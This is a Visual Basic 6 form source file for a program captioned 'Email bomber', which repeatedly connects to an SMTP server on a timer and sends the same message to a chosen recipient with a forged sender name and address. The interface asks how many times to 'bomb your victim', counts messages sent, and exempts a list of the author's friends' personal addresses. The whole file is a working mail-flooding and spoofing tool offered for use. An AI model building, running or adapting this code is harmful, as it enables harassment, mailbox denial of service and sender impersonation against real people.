VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00E0E0E0&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Email bomber"
   ClientHeight    =   7965
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   5715
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "10.frx":0000
   ScaleHeight     =   7965
   ScaleWidth      =   5715
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command3 
      BackColor       =   &H00E0E0E0&
      Caption         =   "Read"
      Height          =   195
      Left            =   4080
      Style           =   1  'Graphical
      TabIndex        =   32
      Top             =   6120
      Width           =   975
   End
   Begin VB.CheckBox regsave 
      BackColor       =   &H8000000B&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000C&
      Height          =   255
      Left            =   3000
      TabIndex        =   30
      Top             =   6120
      Width           =   255
   End
   Begin MSComctlLib.ProgressBar Pb 
      Height          =   255
      Left            =   480
      TabIndex        =   27
      Top             =   7320
      Width           =   4815
      _ExtentX        =   8493
      _ExtentY        =   450
      _Version        =   393216
      Appearance      =   1
      Min             =   1
      Scrolling       =   1
   End
   Begin VB.TextBox txtTimes 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   195
      Left            =   2640
      TabIndex        =   26
      Top             =   5640
      Width           =   1695
   End
   Begin VB.CommandButton Command2 
      BackColor       =   &H00E0E0E0&
      Caption         =   "Set"
      Height          =   195
      Left            =   4080
      Style           =   1  'Graphical
      TabIndex        =   24
      Top             =   6720
      Width           =   975
   End
   Begin VB.CommandButton Command1 
      BackColor       =   &H00E0E0E0&
      Caption         =   "Set"
      Height          =   195
      Left            =   4080
      Style           =   1  'Graphical
      TabIndex        =   22
      Top             =   6480
      Width           =   975
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   195
      Left            =   2280
      TabIndex        =   21
      Text            =   "1"
      Top             =   6480
      Width           =   1695
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   2
      Left            =   4560
      Top             =   2160
   End
   Begin VB.TextBox txtFromAddress 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   285
      Left            =   1320
      TabIndex        =   10
      Top             =   1920
      Width           =   3045
   End
   Begin VB.TextBox txtToAddress 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   285
      Left            =   1320
      TabIndex        =   9
      Top             =   3120
      Width           =   3045
   End
   Begin VB.TextBox txtBody 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   1185
      Left            =   1320
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   8
      Top             =   4320
      Width           =   3045
   End
   Begin VB.TextBox SMTP_HOST 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   195
      Left            =   2280
      TabIndex        =   7
      Text            =   "mail.btinternet.com"
      Top             =   6720
      Width           =   1695
   End
   Begin VB.TextBox txtFromName 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   285
      Left            =   1320
      TabIndex        =   6
      Top             =   1320
      Width           =   3045
   End
   Begin VB.TextBox txtToName 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   285
      Left            =   1320
      TabIndex        =   5
      Top             =   2520
      Width           =   3045
   End
   Begin VB.TextBox txtSubject 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   285
      Left            =   1320
      TabIndex        =   4
      Top             =   3720
      Width           =   3045
   End
   Begin VB.PictureBox Picture1 
      BorderStyle     =   0  'None
      Height          =   390
      Left            =   1320
      Picture         =   "10.frx":93CDE
      ScaleHeight     =   390
      ScaleWidth      =   690
      TabIndex        =   3
      Top             =   6000
      Width           =   690
   End
   Begin VB.PictureBox Picture2 
      BorderStyle     =   0  'None
      Height          =   390
      Left            =   2160
      Picture         =   "10.frx":94BC0
      ScaleHeight     =   390
      ScaleWidth      =   690
      TabIndex        =   2
      Top             =   6000
      Width           =   690
   End
   Begin VB.PictureBox Picture3 
      BorderStyle     =   0  'None
      Height          =   255
      Left            =   5040
      Picture         =   "10.frx":95AA2
      ScaleHeight     =   255
      ScaleWidth      =   255
      TabIndex        =   1
      Top             =   120
      Width           =   255
   End
   Begin VB.PictureBox Picture4 
      BorderStyle     =   0  'None
      Height          =   255
      Left            =   4800
      Picture         =   "10.frx":95E58
      ScaleHeight     =   255
      ScaleWidth      =   255
      TabIndex        =   0
      Top             =   120
      Width           =   255
   End
   Begin MSWinsockLib.Winsock sckmain 
      Left            =   480
      Top             =   2520
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemoteHost      =   "smtp.kabelfoon.nl"
      RemotePort      =   25
      LocalPort       =   6000
   End
   Begin VB.Label Label14 
      BackStyle       =   0  'Transparent
      Caption         =   "Yes"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   3360
      TabIndex        =   31
      Top             =   6120
      Width           =   765
   End
   Begin VB.Label Label13 
      BackStyle       =   0  'Transparent
      Caption         =   "Save In Reg?"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000C&
      Height          =   255
      Left            =   3000
      TabIndex        =   29
      Top             =   5880
      Width           =   1335
   End
   Begin VB.Label Label12 
      BackStyle       =   0  'Transparent
      Caption         =   "Progress Bar:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   960
      TabIndex        =   28
      Top             =   7080
      Width           =   1245
   End
   Begin VB.Label Label11 
      BackStyle       =   0  'Transparent
      Caption         =   "Amount:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   1320
      TabIndex        =   25
      Top             =   5640
      Width           =   765
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Remove Host:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   960
      TabIndex        =   23
      Top             =   6720
      Width           =   1245
   End
   Begin VB.Label Label10 
      BackStyle       =   0  'Transparent
      Caption         =   "Speed:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   960
      TabIndex        =   20
      Top             =   6480
      Width           =   645
   End
   Begin VB.Label Label9 
      BackStyle       =   0  'Transparent
      Caption         =   "Times"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   3600
      TabIndex        =   19
      Top             =   7680
      Width           =   645
   End
   Begin VB.Label Label8 
      BackStyle       =   0  'Transparent
      Caption         =   "Currently Bombed:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   1440
      TabIndex        =   18
      Top             =   7680
      Width           =   1605
   End
   Begin VB.Label amount 
      BackColor       =   &H00E0E0E0&
      BackStyle       =   0  'Transparent
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   3120
      TabIndex        =   17
      Top             =   7680
      Width           =   495
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Sender's e-mail address:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   1320
      TabIndex        =   16
      Top             =   1680
      Width           =   2655
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Receiver's e-mail address:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   1320
      TabIndex        =   15
      Top             =   2880
      Width           =   2655
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Body:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   1320
      TabIndex        =   14
      Top             =   4080
      Width           =   480
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "Receiver's name:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   1320
      TabIndex        =   13
      Top             =   2280
      Width           =   1635
   End
   Begin VB.Label Label7 
      BackStyle       =   0  'Transparent
      Caption         =   "Subject:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   1320
      TabIndex        =   12
      Top             =   3480
      Width           =   645
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "Sender's name:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   1320
      TabIndex        =   11
      Top             =   960
      Width           =   1365
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
' server properties
Const SERVER = "mail.hotmail.com"
Const PORT = 25

Sub SendMail()
Dim email As String
    Dim strAddress As String
    Dim MyAddressCheck As clsAddressCheck     'Create a new object
    Dim lngMsgStyle As VbMsgBoxStyle
    Dim strMsg As String
    Dim blnResult As Boolean
    Dim blnResult2 As Boolean
    Dim strAddress2 As String
    
    strAddress = Me.txtToAddress.Text 'Take a copy of the address entered by the user
    strAddress2 = Me.txtFromAddress.Text
    '////  test to see if an address has been entered
    If Trim$(strAddress) = vbNullString Then    'Trim$() removed the space character from the front and back of a string
       MsgBox "Sender's Email Address Invalid" & vbCrLf & "Please Use Correct Charactors", vbCritical, "Email bomb"
    Timer1.Enabled = False
    GoTo 2
     Exit Sub    'Exit the sub beasue we have no address to check!
    End If
    If Trim$(strAddress2) = vbNullString Then    'Trim$() removed the space character from the front and back of a string
    MsgBox "Recievers Email Address Invalid" & vbCrLf & "Please Use Correct Charactors", vbCritical, "Email bomb"
    Timer1.Enabled = False
    GoTo 2
    Exit Sub    'Exit the sub beasue we have no address to check!
    End If
    '////  if we get here then we have some text to verify as an address
    
    
    '////  HERE is where we get to use the class to test the address
    Set MyAddressCheck = New clsAddressCheck                    'Create a new address checker object
    blnResult = MyAddressCheck.CheckEmailAddress(strAddress) 'Test the address
    Set MyAddressCheck = Nothing
    Set MyAddressCheck = New clsAddressCheck
    blnResult2 = MyAddressCheck.CheckEmailAddress(strAddress2)
    Set MyAddressCheck = Nothing                                'Destroy the address checker object
    '////////////////////////////////////////////////////////////////
    
    
    '/// buld the response
    If blnResult = True Then
   GoTo 3
    Else
    MsgBox "Sender's Email Address Invalid" & vbCrLf & "Please Use Correct Charactors", vbCritical, "Email bomb"
    Timer1.Enabled = False
    GoTo 2
    End If
    
    If blnResult2 = True Then
   GoTo 3
    Else
    MsgBox "Recievers Email Address Invalid" & vbCrLf & "Please Use Correct Charactors", vbCritical, "Email bomb"
    Timer1.Enabled = False
    GoTo 2
    End If


3:










'norm shit
If txtFromName.Text = "" Then
MsgBox "All Fields Have Not Been Entered," & vbCrLf & "Please Enter The Senders Name", vbExclamation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtFromAddress.Text = "" Then
MsgBox "All Fields Have Not Been Entered," & vbCrLf & "Please Enter The Sender's Address.", vbExclamation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtToName.Text = "" Then
MsgBox "All Fields Have Not Been Entered," & vbCrLf & "Please Enter The Reciever's Name.", vbExclamation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtToAddress.Text = "" Then
MsgBox "All Fields Have Not Been Entered," & vbCrLf & "Please Enter The Send To Address Field.", vbExclamation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtSubject.Text = "" Then
MsgBox "All Fields Have Not Been Entered," & vbCrLf & "Please Enter The Subject Field.", vbExclamation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtTimes.Text = "" Then
MsgBox "You Have Not Defined How Many Times You Wish To Bomb Your Victim," & vbCrLf & "Please Enter The Amount Field.", vbExclamation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtTimes Like "-*" Then
MsgBox "You may not use the - input value" & vbCrLf & "Please Enter Correctly", vbExclamation, "Email bomb"
Timer1.Enabled = False
GoTo 2
End If
If txtToAddress = "dreamingweb@hotmail.com" Then
MsgBox "DON'T EVEN THINK ABOUT IT" & vbCrLf & "Dreamingweb RULES!", vbInformation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtFromAddress = "dreamingweb@hotmail.com" Then
MsgBox "DON'T EVEN THINK ABOUT IT" & vbCrLf & "Dreamingweb Is Me And RULES!", vbInformation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtToAddress = "cp_eweaver@hotmail.com" Then
MsgBox "DON'T EVEN THINK ABOUT IT" & vbCrLf & "#~E#WeAvEr~# RULES!", vbInformation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtFromAddress = "cp_eweaver@hotmail.com" Then
MsgBox "DON'T EVEN THINK ABOUT IT" & vbCrLf & "#~E#WeAvEr~# RULES!", vbInformation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtToAddress = "deaddevil@hotmail.com" Then
MsgBox "DON'T EVEN THINK ABOUT IT" & vbCrLf & "Dead Devil Is My M8!", vbInformation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtFromAddress = "deaddevil@hotmail.com" Then
MsgBox "DON'T EVEN THINK ABOUT IT" & vbCrLf & "Dead Devil Is My M8!", vbInformation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtToAddress = "angeliclaura@hotmail.com" Then
MsgBox "DON'T EVEN THINK ABOUT IT" & vbCrLf & "She's Too Kewl!", vbInformation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtToAddress = "massaker_rat@hotmail.com" Then
MsgBox "DON'T EVEN THINK ABOUT IT" & vbCrLf & "Don't Fuck About Wid Hackers!", vbInformation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtToAddress = "hate_144@hotmail.com" Then
MsgBox "DON'T EVEN THINK ABOUT IT" & vbCrLf & "Don't Fuck About Wid My Crew", vbInformation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtToAddress = "bishopstone@hotmail.com" Then
MsgBox "DON'T EVEN THINK ABOUT IT" & vbCrLf & "Don't Fuck About Wid My Crew", vbInformation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If
If txtToAddress = "mydnightsun@hotmail.com" Then
MsgBox "DON'T EVEN THINK ABOUT IT" & vbCrLf & "Because Hez Kewl!", vbInformation, "Email bomb"
Timer1.Enabled = False
GoTo 1
End If

If regsave.Value = 1 Then
CreateKey "HKCU\Software\TechnoBOT\Emailer\To", txtToAddress.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\ToName", txtToName.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\From", txtFromAddress.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\FromName", txtFromName.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\Subject", txtSubject.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\Body", txtBody.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\Amount", txtTimes.Text
End If

Pb.Value = "10"
'above validation script
    sckmain.Close
    If sckmain.State = sckError Then
    sckmain.Close
    End If
    
    ' set the socket properties
    sckmain.RemoteHost = SERVER
    sckmain.RemotePort = PORT
    sckmain.Connect
    Pb.Value = "20"
    
    ' wait until the socket is fully connected
    Do
        ' do nothing
        DoEvents
        ' check for errors
        If sckmain.State = sckError Then
            sckmain.Close
            Exit Sub
       End If
    ' loop until we're connected
    Loop While sckmain.State <> sckConnected
    Pb.Value = "30"
    ' if we've got here, we're connected
    ' so start sending data
    With sckmain
        ' HELO
        .SendData "HELO hotmail.com" & vbCrLf
        DoEvents
        Pb.Value = "40"
        ' MAIL FROM
        .SendData "MAIL FROM: " & txtFromAddress.Text & vbCrLf
        DoEvents
        Pb.Value = "50"
        ' RCPT TO
        .SendData "RCPT TO: " & txtToAddress.Text & vbCrLf
        DoEvents
        Pb.Value = "60"
        ' DATA
        .SendData "DATA" & vbCrLf
        DoEvents
        Pb.Value = "70"
        ' BODY
        .SendData "Subject: " & txtSubject.Text & vbCrLf
        .SendData "To: " & txtToName.Text & vbCrLf
        Pb.Value = "80"
        ' send two vbCrLf to create a blank line between message
        ' options and actual message body text
        .SendData "Subject: " & txtFromName.Text & vbCrLf & vbCrLf
        ' send the main body message, then the
        ' send the "." on a line on its own to finish
        .SendData txtBody.Text & vbCrLf & "." & vbCrLf
        DoEvents
        Pb.Value = "90"
        ' QUIT
        .SendData "QUIT" & vbCrLf
        DoEvents
        Pb.Value = "100"
    End With
    ' done
    amount.Caption = amount.Caption + 1
    txtTimes.Text = txtTimes.Text - 1
1:
If txtTimes.Text + 1 = 1 Then
txtTimes.Text = ""
sckmain.Close
MsgBox "Email bomb Complete!" & vbCrLf & "Please Enter The Amount Field.", vbExclamation, "Email bomb"
Timer1.Enabled = False
End If
2:

End Sub
Private Sub Command1_Click()
Timer1.Interval = Text2.Text
End Sub

Private Sub Command2_Click()
sckmain.RemoteHost = SMTP_HOST.Text
End Sub

Private Sub Command3_Click()
Timer1.Enabled = False
Pb.Value = "1"
txtToAddress.Text = ReadKey("HKCU\Software\TechnoBOT\Emailer\To")
Pb.Value = "15"
txtToName.Text = ReadKey("HKCU\Software\TechnoBOT\Emailer\ToName")
Pb.Value = "30"
txtFromAddress.Text = ReadKey("HKCU\Software\TechnoBOT\Emailer\From")
Pb.Value = "45"
txtFromName.Text = ReadKey("HKCU\Software\TechnoBOT\Emailer\FromName")
Pb.Value = "60"
txtSubject.Text = ReadKey("HKCU\Software\TechnoBOT\Emailer\Subject")
Pb.Value = "75"
txtBody.Text = ReadKey("HKCU\Software\TechnoBOT\Emailer\Body")
Pb.Value = "90"
txtTimes.Text = ReadKey("HKCU\Software\TechnoBOT\Emailer\Amount")
Pb.Value = "100"
End Sub



Private Sub Form_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
If Button = vbLeftButton Then
  ReleaseCapture
  SendMessage Me.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&
End If
End Sub

Private Sub Picture1_Click()
Timer1.Enabled = True
End Sub

Private Sub Picture2_Click()
sckmain.Close
txtFromName.Text = ""
txtFromAddress.Text = ""
txtToName.Text = ""
txtToAddress.Text = ""
txtSubject.Text = ""
txtTimes.Text = ""
End Sub

Private Sub Picture3_Click()
sckmain.Close
If regsave.Value = 1 Then
CreateKey "HKCU\Software\TechnoBOT\Emailer\To", txtToAddress.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\ToName", txtToName.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\From", txtFromAddress.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\FromName", txtFromName.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\Subject", txtSubject.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\Body", txtBody.Text
CreateKey "HKCU\Software\TechnoBOT\Emailer\Amount", txtTimes.Text
End If
Me.Hide
End Sub

Private Sub Timer1_Timer()
SendMail
End Sub

